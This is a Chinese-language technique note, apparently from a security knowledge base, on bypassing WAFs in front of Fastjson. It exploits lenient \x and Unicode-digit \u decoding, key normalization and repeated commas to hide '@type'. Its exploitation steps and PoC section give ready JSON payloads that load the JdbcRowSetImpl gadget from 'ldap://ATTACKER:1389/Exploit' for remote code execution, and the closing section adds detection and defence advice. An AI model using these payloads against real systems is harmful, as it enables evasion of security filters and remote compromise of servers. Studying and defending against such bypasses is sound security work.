---
id: web-java-deser-fastjson-waf-ghostbits-escape
title: Fastjson WAF 绕过：\x 非 hex 字符与 Unicode 数字伪造 @type（GhostBits）
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-ghostbits-waf-bypass
aliases:
- Fastjson WAF 绕过
- GhostBits
- \x 绕过 @type
- \u Unicode 数字绕过
- fastjson 多逗号绕过
- fastjson 下划线 key 归一化
- '@type 编码绕过'
tags:
- java
- fastjson
- waf-bypass
- ghostbits
- unicode
- escaping
- parser-differential
cve: []
severity: high
confidence: medium
status: draft
created: '2026-11-04'
updated: '2026-11-04'
---

## 一句话结论

Fastjson 解析 `\x` 转义时用一张默认值为 0 的 103 项 `digits` 表，只填 `0-9A-Fa-f`，因此 `\x4_`、`\x4J` 这类“非 hex 第二字符”仍解出 `\x40`（`@`）；`\u` 走 `Character.digit(c,16)`，会接受泰文/全角等 Unicode 数字，`\u๐๐੪๐` 同样可解出 `@`。WAF 按字面看不到 `@type`，后端却能还原出完整关键字。

## 原理

这是解析器与 WAF 对同一字节序列的“还原规则”不一致：

**`\x` 路径**：Fastjson 解析 `\xHH` 时构造 `int[103] digits`，只在 `0-9`、`A-F`、`a-f` 对应下标填真实数值，其余下标保持 0。计算为 `digits[hi] * 16 + digits[lo]`。只要 `hi` 是 `4`，`lo` 无论是不是 `0`（如 `_`、`J`）都得到 0，结果都是 `0x40`。于是 `\x4_type`、`\x4Jtype` 都会被解析成 `@type`，但 WAF 的字面规则匹配不到 `@type`。

**`\u` 路径**：Fastjson 用 `Character.digit(c, 16)` 解析四位 hex。该方法不只认 ASCII `0-9a-f`，还接受整个 Unicode 中具有数字属性的字符（泰文数字、全角数字等）。`\u๐๐੪๐` 中的字符按 16 进制数字解释后组合为 `0x0040`，即 `@`，但原始字节里没有 `0`/`4` 的 ASCII 特征。

**其他归一化差异**：

- Fastjson 解析字段 key 时会把 `_` 和 `-` 去掉；`d_a_t_aSourceName` 仍对应 `dataSourceName`（1.2.36 起支持混合使用）。
- 连续多个逗号（`,,,,,,`）被忽略，可打断 WAF 的键值正则。
- `\uXXXX` 形式的 `@`、字母可拆分关键字；超大字段填充可利用只按体积放行的 WAF。
- GhostBits 同类问题也影响其他 JSON/URL 解码器，但落到 Fastjson 主要是 `\x` 与 `\u` 两处。

## 触发条件

- 目标使用 Fastjson 解析请求体，且前置 WAF/网关按字面匹配 `@type`、`com.sun.rowset.JdbcRowSetImpl`、`ldap://` 等关键字；
- WAF 未对请求体做与 Fastjson 等价的转义还原；
- 后端 Fastjson 版本支持上述宽松 `\x`/`\u` 解码；
- 后端存在可用 gadget（如 JdbcRowSetImpl/JNDI、BCEL、commons-io 等），WAF 只拦关键字不拦行为。

## 利用步骤

1. 先用一个被 WAF 明确拦截的普通 payload 确认拦截点与关键字（如 `@type`、类名、协议前缀）。
2. 把 `@` 改写为 `\x40` 的宽松形式（`\x4_`、`\x4J`、`\x4!`），把 `type` 等字母用 `\u` 或普通字符混合。
3. 把敏感类名/URL 中的字符做 Unicode 转义或利用 key 归一化（`d_a_t_aSourceName`）。
4. 发送后观察是否仍被拦截；若后端返回解析错误而非 WAF 拦截页，说明已进入 Fastjson。
5. 叠加完整 gadget（如 JdbcRowSetImpl + LDAP）验证最终效果。

## PoC

```json
{"\x4_type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER:1389/Exploit","autoCommit":true}
```

```json
{"\x4Jtype":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER:1389/Exploit","autoCommit":true}
```

```json
{"\u๐๐੪๐type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER:1389/Exploit","autoCommit":true}
```

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl",'d_a_t_aSourceName':"ldap://ATTACKER:1389/Exploit","autoCommit":true}
```

```json
{,,,,,,"\x4_type":"com.sun.rowset.JdbcRowSetImpl",,,,,,"dataSourceName":"ldap://ATTACKER:1389/Exploit",,,,,,"autoCommit":true}
```

```json
{"\u+040\u+074\u+079\u+070\u+065":"java.lang.AutoCloseabl\u+065"}
```

## 变体与关联

- `\x` 变体：第二字符可替换为任意非 hex 字符；`\x4_`/`\x4J`/`\x4!` 都得到 `@`。
- `\u` 变体：用泰文、全角、其他 Unicode 数字冒充 hex；与 `\u+`、普通 `\uXXXX` 混用。
- 结构变体：多逗号、`_`/`-` 归一化、超大字段填充、Unicode 转义拆散类名/协议。
- 关联：Fastjson 各版本 gadget 链（1.2.47/1.2.68/1.2.80/1.2.83）；GhostBits 同样影响 Jackson、BCEL、Tomcat 上传、URLDecoder 等解析器，可套用相同“解析差异”思路。
- 不确定性：`\u` 的具体可用字符集依赖 JDK `Character.digit` 与 Fastjson 版本；`\x` 行为在原文实验中稳定，但上线前应在目标同版本验证。

## 检测与防御

- 检测：请求体中出现 `\x` 后跟非 hex 字符、`\u` 后跟非 ASCII hex、连续多个逗号、key 中含 `_`/`-` 的异常组合；同一请求在 WAF 日志中未被拦截但后端 Fastjson 产生解析异常。
- 防御：WAF 不要只做字面匹配，应在解码/归一化后（按 Fastjson 语义）再做检测；对 JSON 键名做规范化；限制单字段体积；升级 Fastjson 并开启 SafeMode；对 `@type` 做结构级白名单。
- 注意：编码绕过只是 WAF 层规避，不改变后端漏洞；必须同时修复 Fastjson 与 gadget 依赖。
